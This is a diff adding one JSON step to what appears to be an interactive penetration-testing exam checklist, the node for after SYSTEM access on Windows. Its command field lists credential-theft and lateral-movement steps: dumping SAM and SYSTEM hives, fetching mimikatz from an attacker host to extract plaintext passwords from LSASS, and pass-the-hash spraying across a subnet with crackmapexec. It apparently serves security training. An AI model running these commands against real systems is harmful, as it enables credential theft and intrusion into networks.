@@ -1,0 +1,18 @@
+{
+  "id": "got_root_windows",
+  "phase": "WINDOWS",
+  "title": "SYSTEM — Windows",
+  "body": "SYSTEM shell. Get proof, take the screenshot correctly. whoami + hostname + ipconfig + proof.txt all visible.",
+  "cmd": "whoami   # should show NT AUTHORITY\\SYSTEM or Administrator\nhostname\nipconfig /all\ntype C:\\Users\\Administrator\\Desktop\\proof.txt\n\n# ── POST-SYSTEM ACTIONS ──────────────────────────────\n# Dump hashes immediately\nreg save HKLM\\SAM C:\\Windows\\Temp\\sam\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\system\nimpacket-secretsdump -sam sam -system system local\n\n# Mimikatz — plaintext creds from LSASS\niwr http://$lhost/mimikatz.exe -OutFile C:\\Windows\\Temp\\m.exe\n.\\m.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n\n# Spray dumped hashes laterally\ncrackmapexec smb $ip/24 -u Administrator -H NTLMHASH --shares\ncrackmapexec smb $ip/24 -u Administrator -H NTLMHASH -x \"whoami\"\n\n\n# Screenshot checklist:\n# ✅ whoami showing SYSTEM or Administrator\n# ✅ hostname visible\n# ✅ ipconfig showing target IP\n# ✅ type proof.txt showing hash\n# ✅ All in ONE screenshot",
+  "warn": null,
+  "choices": [
+    {
+      "label": "New subnet in route print — pivot!",
+      "next": "pivot_start"
+    },
+    {
+      "label": "Back to start — next machine",
+      "next": "start"
+    }
+  ]
+}
